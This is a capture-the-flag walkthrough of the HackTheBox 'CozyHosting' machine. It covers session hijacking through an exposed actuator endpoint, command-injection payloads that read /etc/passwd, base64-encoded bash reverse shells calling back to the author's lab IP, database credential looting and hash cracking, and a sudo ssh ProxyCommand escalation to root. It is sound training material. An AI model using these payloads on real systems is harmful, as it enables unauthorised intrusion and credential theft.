  ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/80e00deb-fb7e-4766-9811-458e6211d32e)
  https://app.hackthebox.com/machines/559

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration: Uncovering Open Ports

To initiate the enumeration process, I started with a rapid rustscan, which promptly revealed the existence of 4 open ports. Here are the results:

```Rust
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp   open  http        syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
8000/tcp open  http-alt?   syn-ack ttl 63
9001/tcp open  tor-orport? syn-ack ttl 63
```

Additionally, I identified a domain running on port 80: "cozyhosting.htb." To facilitate access, I added this domain to my host configuration file.

Subsequently, I explored the domain and discovered that it primarily offers web hosting services. This observation piqued my curiosity, and I delved further into my enumeration process.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/faa649f8-1356-4c7d-b81e-10c9bbe7cb6f)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Fuzzing:

After adding the "cozyhosting.htb" domain to my host configuration file, I proceeded to perform both VHost and Sub-Directory enumeration. Although VHost fuzzing didn't yield any significant results, my subdirectory scan provided some interesting findings.

For VHost fuzzing, I executed the following command:

```bash
ffuf -H "Host: FUZZ.cozyhosting.htb" -u http://10.10.11.230 -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 178
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/cf3ef662-d17e-494e-a273-6cf9071288e5)

In this case, the VHost fuzzing didn't provide any valuable information.

Next, I conducted a subdirectory scan using the following command:

```bash
gobuster dir -u http://cozyhosting.htb/ -t 20 -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -x php,txt -e -b 404,403,400 -k
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/223cd081-2f83-4400-b3f5-882c02898eda)

The subdirectory scan, on the other hand, returned some interesting outcomes.

Upon examining the "/actuator" path, I discovered additional directories presented in JSON format:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/86840271-9cad-47fa-afc7-679f6b7f213c)
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9ae1197f-6f33-421e-ad0f-b1bd166e3792)

I decided to explore these paths one by one and stumbled upon some session keys within the "/session" directory. Notably, these keys appeared to belong to a user named "kanderson":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/86504c16-b4bc-4bb1-847f-86135f71dc00)

With the session ID in hand, I attempted to access the "/admin" panel and successfully bypassed the login screen by utilizing the Session ID value. As a result, I gained access as the user "Kanderson":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/777606f0-0209-42bb-90d7-a920ba76ee75)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6643c243-2c32-4fc3-9304-6a5613721608)

While exploring the admin panel, I came across an option to connect via SSH:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/940cdec5-c58d-4604-9f1a-f1f781a6ef81)

Upon specifying the box's IP as the host and using "kanderson" as the username, I encountered an error message stating "Host key verification failed":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6a662605-ac37-4885-aefb-4ab7e8126aa5)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Command Injection: Gaining Control

Upon submitting a blank username in the request, I received a response stating "error usage SSH":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6cb55166-a0bc-4878-be0e-2642c08a00f6)

This led me to suspect the presence of a potential command injection vulnerability within the username field. To verify this vulnerability, I experimented with various payloads. After multiple attempts, I finally received a partial response using the following payload, which allowed me to view only the first line of the passwd file:

```bash
$(cat${IFS}/etc/passwd) #${IFS} used instead of space.
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b246fd83-abf3-40e8-b07c-30ce6b622d06)

It appeared that some form of input sanitization partially blocked the request, preventing the retrieval of the entire /etc/passwd file. To bypass this filter and obtain the full content of the passwd file, I utilized the tail command with Burp Intruder.

Using the Burp Intruder, I successfully retrieved the complete content of the passwd file:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/846e724d-7d93-40fa-9f29-748ccaf4a1a8)

Analyzing the passwd file, I noticed the presence of a user named "josh" on the target host.

Continuing my exploration, I crafted a bash reverse shell in base64 format and executed it using the following one-liner with echo and bash:

```bash
$(echo${IFS}"JCgvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzYvMTMzNyk"${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)
```

I successfully obtained a reverse shell as the user "app," but the connection was unstable and constantly dropped: 😕

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/67e87516-4616-48d0-90c0-a29f462323d1)

After troubleshooting, I realized that my bash reverse shell was incomplete, causing the connection to drop consistently. I modified the payload, started my netcat listener again, and this time received a stable reverse shell: 🙂

```bash
$(echo${IFS}"JChiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM2LzEzMzcgMD4mMSk"${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)
```
This revised payload provided a stable reverse shell, allowing me to progress further in my exploitation.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Obtaining the User Flag

Following my initial access to the machine, I noticed the presence of a file named "cloudhosting-0.0.1.jar" in the '/app' directory. I transferred this file to my local host and proceeded to extract its contents.

After extracting the JAR file, I explored the contained folders and stumbled upon a file that held PostgreSQL-related credentials:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d0f9a093-43d2-4dc1-afd8-30e81e13b269)

Armed with these PostgreSQL credentials, I initiated a connection to PostgreSQL (psql) with the help of some online references:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/14692628-bbb7-42c4-af4d-16ae6b830185)

Upon successfully authenticating, I discovered a database named "cozyhosting." Inside this database, I located user tables containing password hashes:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8b5e0ec6-3714-4f46-a493-e104a18af5d3)

Inspecting these hashes, I determined that they were in bcrypt format:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a0ba71cc-9c4c-4359-92b2-613c39e973c7)

To crack these hashes, I employed hashcat. However, I was only successful in cracking the admin hash:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/1e6f48c1-e537-4200-863a-d9fd898bf504)

With the cracked password in hand, I attempted to log in as "Josh" since there were no other user accounts present. Using the cracked password, I successfully accessed Josh's account via SSH:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f53cea88-6158-41f4-8046-ca50b997815e)

Furthermore, I located the user flag in Josh's home directory, marking a successful step forward in the engagement: (pwn3d! 🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3d0754f6-f753-4117-99cf-8cc8feb668c2)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Root.txt: Escalating Privileges

To acquire the root flag, I needed to escalate my privileges. To explore the potential privileges vector, I commenced with manual enumeration.

One of the initial steps involved inspecting the sudo permissions assigned to the user "Josh." It was evident that Josh had the capability to execute SSH as the root user:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/20b7ae6b-c09a-4ff0-9f66-4934f9140b77)

Next, I sought a suitable sudo command from [gtfobins](https://gtfobins.github.io/) related to SSH that could be leveraged to escalate my privileges. Fortunately, I found an appropriate one:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/671e5899-6b59-41ce-b7d0-a7131493860d)

I employed the ProxyCommand option with SSH to establish a shell and executed SSH as a sudo user to elevate my privileges to root:

```bash
sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/27064d66-b8db-438c-a851-9e338d3d5abd)

After executing the above command, I successfully obtained a shell with root privileges. (pwn3d! 🙂)
